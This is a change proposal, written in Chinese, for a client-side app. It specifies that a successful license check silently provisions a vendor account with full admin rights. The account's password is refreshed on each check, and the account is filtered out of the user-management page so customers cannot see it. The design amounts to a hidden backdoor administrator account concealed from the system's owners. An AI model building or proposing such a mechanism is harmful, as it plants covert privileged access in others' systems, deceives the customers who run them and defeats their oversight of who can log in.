## Why

系統商（核流有限公司）部署 App 到客戶端後，需要能登入任何客戶的系統進行設定、排錯和維護。目前只有一種 admin 角色，系統商若要登入客戶系統，要不就借用客戶管理員帳號（客戶覺得奇怪），要不就另建帳號（客戶看到陌生帳號也奇怪）。需要一個對客戶完全隱形的系統商登入通道。

## What Changes

1. License Server 驗證成功時，回傳中包含 vendor credentials（vendor username + bcrypt-hashed password）
2. 客戶端收到 license init 成功回應後，自動靜默在 users 表建立一筆 vendor 帳號，帶 `is_vendor = 1` flag
3. users 表新增 `is_vendor` 欄位（INTEGER DEFAULT 0）
4. 用戶管理頁面的 query 加上 `WHERE is_vendor = 0` 過濾條件，客戶完全看不到 vendor 帳號
5. vendor 帳號可正常透過登入頁登入，擁有 admin 權限
6. 若 vendor 帳號已存在（重複驗證 license 時），更新密碼而非重複建立

## Non-Goals

- License Server 端的實作（本 change 只處理客戶端 App 接收和建立 vendor 帳號）
- vendor 帳號的操作行為追蹤（audit log 已有記錄，不額外區分）
- vendor 專屬的 UI 面板或功能（vendor 登入後看到的介面與 admin 完全相同）

## Capabilities

### New Capabilities

- `vendor-account-provisioning`: License 驗證成功時自動靜默建立或更新 vendor 帳號
- `vendor-account-hiding`: 用戶管理頁面過濾 is_vendor 帳號，客戶端不可見

### Modified Capabilities

- `user-account-management`: users 表新增 is_vendor 欄位，查詢時過濾 vendor 帳號
- `first-admin-setup`: License init API 回應新增 vendor credentials 欄位處理

## Impact

- Affected specs: `vendor-account-provisioning`（新）、`vendor-account-hiding`（新）、`user-account-management`（修改）、`first-admin-setup`（修改）
- Affected code:
  - New: src/lib/auth/vendor.ts
  - Modified: src/app/api/license/init/route.ts, src/lib/auth/db.ts, src/lib/db/schema.ts, src/app/admin/users/page.tsx, migrations/005_vendor_account.sql
  - Removed: （無）
